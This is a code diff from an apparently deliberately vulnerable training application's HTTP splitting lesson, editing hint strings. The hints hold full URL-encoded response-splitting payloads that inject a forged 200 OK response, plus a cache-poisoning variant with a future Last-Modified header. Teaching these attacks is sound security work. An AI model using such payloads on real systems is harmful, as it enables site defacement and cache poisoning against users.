@@ -228,11 +228,11 @@ public class HttpSplitting extends SequentialLessonAdapter
 		hints.add("The Content-Length: 0 will tell the server that the first request is over.");
 		hints.add("A 200 OK message looks like this: HTTP/1.1 200 OK");
 		hints
-				.add("NOTE: THIS HINT IS FOR WINDOWS AND HAS TO BE ALTERED FOR ANOTHER SYSTEM <br/> Try: language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;");
+				.add("NOTE: THIS HINT IS FOR WINDOWS AND HAS TO BE ALTERED FOR ANOTHER SYSTEM <br/> Try: foobar%0D%0AContent-Length%3A%200%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0AContent-Length%3A%2047%0D%0A%0D%0A%3Chtml%3EHacked!%3C%2Fhtml%3E <br/>For insight into what this does, use the PHP charset encoder to decode it.");
 		hints
 				.add("Cache Poisoning starts with including 'Last-Modified' header in the hijacked page and setting it to a future date.");
 		hints
-				.add("NOTE: THIS HINT IS FOR WINDOWS AND HAS TO BE ALTERED FOR ANOTHER SYSTEM <br/>Try language=?foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202030%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Insert undesireable content here&lt;/html&gt;");
+				.add("NOTE: THIS HINT IS FOR WINDOWS AND HAS TO BE ALTERED FOR ANOTHER SYSTEM <br/>Try foobar%0D%0AContent-Length%3A%200%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202080%2014%3A50%3A18%20GMT%0D%0AContent-Length%3A%2047%0D%0A%0D%0A%3Chtml%3EHacked%20J%3C%2Fhtml%3E");
 		hints
 				.add("'Last-Modified' header forces the browser to send a 'If-Modified-Since' header. Some cache servers will take the bait and keep serving the hijacked page");
 		hints
